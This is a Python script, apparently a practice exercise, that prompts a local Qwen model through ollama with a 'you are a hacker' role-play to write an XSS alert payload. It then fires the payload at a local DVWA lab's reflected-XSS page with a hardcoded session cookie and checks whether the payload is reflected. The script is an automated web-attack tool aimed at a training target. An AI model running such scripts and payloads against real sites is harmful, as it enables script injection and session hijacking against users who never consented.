import requests
import ollama

# 靶场地址
url = "http://127.0.0.1/vulnerabilities/xss_r/"

# 警告：实际使用时必须替换为你浏览器 F12 抓到的真实 PHPSESSID
cookies = {
    "PHPSESSID": "j5ngfrpuko2aqgo0rht4am0sh4",  
    "security": "low"
}

print("【1】正在启动 Docker 靶场...")
# 如果你在本地跑，这行可以自动拉起靶场
# import os
# os.system("sudo docker start dvwa")

print("【2】AI 正在疯狂思考恶意 Payload...")

# 调用本地 Qwen 模型
response = ollama.chat(model='modelscope.cn/Qwen/Qwen2.5-1.5B-Instruct-GGUF', messages=[
  {
    'role': 'user',
    'content': '你是一个黑客。请生成一个 JavaScript 的 XSS payload，用于弹出一个警告框，内容写“AI破了防”。只输出代码，不要任何解释。'
  }
])

ai_payload = response['message']['content'].strip()
# 清理大模型生成的 markdown 符号
ai_payload = ai_payload.replace("```html", "").replace("```javascript", "").replace("```", "").strip()

print(f"🎯 AI 生成的 Payload: {ai_payload}")
print("【3】正在向靶场发送攻击...")

try:
    r = requests.get(url, params={"name": ai_payload, "Submit": "Submit"}, cookies=cookies, timeout=10)
    # 检查 payload 是否成功反射到页面中
    if ai_payload in r.text or "AI破了防" in r.text:
        print("\n🚨🚨🚨 [致命打击] AI Fuzzing 成功！Payload 生效！\n")
    else:
        print("\n[-] 失败。请检查 PHPSESSID 是否过期或靶场是否未登录。\n")
except Exception as e:
    print(f"\n❌ 请求靶场失败: {e}")
